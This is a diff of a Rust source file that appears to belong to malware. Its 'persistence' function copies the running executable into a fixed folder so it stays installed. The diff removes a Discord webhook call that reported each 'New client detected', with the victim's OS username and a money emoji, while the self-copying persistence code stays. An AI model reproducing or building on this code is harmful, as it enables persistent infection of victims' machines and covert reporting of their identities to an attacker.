@@ -1,5 +1,5 @@
 use std::{path::PathBuf, env::{var, self, current_exe}, io, fs::{create_dir_all, copy}};
-use crate::{FILE_NAME, FOLDER_NAME, fs, discord, os};
+use crate::{FILE_NAME, FOLDER_NAME, fs, os};
 
 pub fn file_exists(file_path: &PathBuf) -> bool {
     file_path.exists() && file_path.is_file()
@@ -34,12 +34,6 @@ pub async fn persistence() -> io::Result<()> {
             if !fs::file_exists(&file_path) {
                 create_dir_all(&folder_path)?;
                 copy(current_path, file_path)?;
-
-                discord::send_webhook(
-                    ":money_with_wings: New client detected",
-                    format!("OS user: {:?}", env::var("USERNAME")).as_str(),
-                    0x00FF00
-                ).await;
             }
         }
         Err(..) => {}
